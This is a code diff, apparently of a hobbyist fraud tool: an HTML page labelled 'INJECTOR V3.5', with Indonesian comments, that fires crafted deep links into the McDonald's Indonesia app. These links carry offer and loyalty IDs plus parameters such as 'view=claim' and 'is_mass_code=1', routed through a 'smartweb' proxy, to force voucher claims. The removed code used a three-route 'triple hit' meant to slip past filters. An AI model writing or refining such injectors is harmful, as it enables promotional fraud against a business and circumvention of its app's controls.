@@ -1,25 +1,56 @@
-function gas() {
-    // Pakai ID Ayam + Nasi (272484) karena ini yang paling stabil di server
-    var o = "272484"; 
-    var l = "5271";
-    
-    // TEKNIK BARU: Jangan kirim banyak parameter sekaligus (Bisa kena Filter)
-    // Kirim ID intinya saja, biarkan aplikasi yang melengkapi sisanya secara otomatis
-    var target = "gmalite://offers/details?offer_id=" + o + "&loyalty_id=" + l;
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>McD Internal System</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
+        .card { background: #222; border: 2px solid #da291c; border-radius: 20px; padding: 20px; margin-top: 20px; }
+        .id-text { font-family: monospace; font-size: 20px; color: #ffbc0d; background: #333; padding: 10px; border-radius: 10px; margin: 15px 0; display: block; }
+        .btn { background: #da291c; color: white; border: none; padding: 15px; border-radius: 12px; width: 100%; font-weight: bold; font-size: 16px; margin-bottom: 10px; }
+        .step { font-size: 12px; color: #aaa; text-align: left; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
 
-    // EKSEKUSI TRIPLE HIT (Tembak 3 jalur berbeda dalam 1 klik)
-    
-    // Jalur 1: Standard Deep Link
-    window.location.href = target;
+    <div class="card">
+        <h3>INJECTOR V3.5</h3>
+        <p class="step">1. Pilih menu yang ingin diinject:</p>
+        <select id="menu" style="width:100%; padding:10px; border-radius:8px;">
+            <option value="272484|5271">Ayam + Nasi + Lemon Tea</option>
+            <option value="272469|5271">McNugget + Cola</option>
+            <option value="267611|5272">Panas 1</option>
+        </select>
 
-    // Jalur 2: Jalur Reward (Jika jalur 1 diblokir)
-    setTimeout(function() {
-        window.location.href = "gmalite://rewards/details?offer_id=" + o + "&loyalty_id=" + l;
-    }, 300);
+        <p class="step">2. Klik tombol di bawah (Ini akan menyalin kode enkripsi):</p>
+        <button class="btn" onclick="copyAndDirect()">COPY & OPEN APP</button>
+        
+        <p style="font-size: 10px; color: #666;">Jika aplikasi terbuka tapi diam, kembali ke sini dan klik lagi.</p>
+    </div>
 
-    // Jalur 3: Jalur Smartweb Proxy (Untuk memaksa respon)
-    setTimeout(function() {
-        var proxy = "https://www.mcdonalds.co.id/promo/details?offer_id=" + o + "&loyalty_id=" + l;
-        window.location.href = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(proxy);
-    }, 600);
-}
+    <script>
+        function copyAndDirect() {
+            var data = document.getElementById('menu').value.split('|');
+            var off = data[0];
+            var loy = data[1];
+
+            // Trik Mukidi: Gunakan URL mcdonalds asli sebagai perantara
+            var target = "gmalite://offers/details?offer_id=" + off + 
+                         "&loyalty_id=" + loy + 
+                         "&view=claim&is_mass_code=1&is_native=true";
+
+            // Eksekusi paksa dengan jeda singkat
+            // Gunakan skema 'smartweb' tapi menuju ke internal voucher
+            var smartweb = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent("https://www.mcdonalds.co.id/promo/details?offer_id="+off);
+
+            // Tembak sekaligus
+            window.location.href = smartweb;
+            
+            setTimeout(function() {
+                window.location.href = target;
+            }, 500);
+        }
+    </script>
+</body>
+</html>
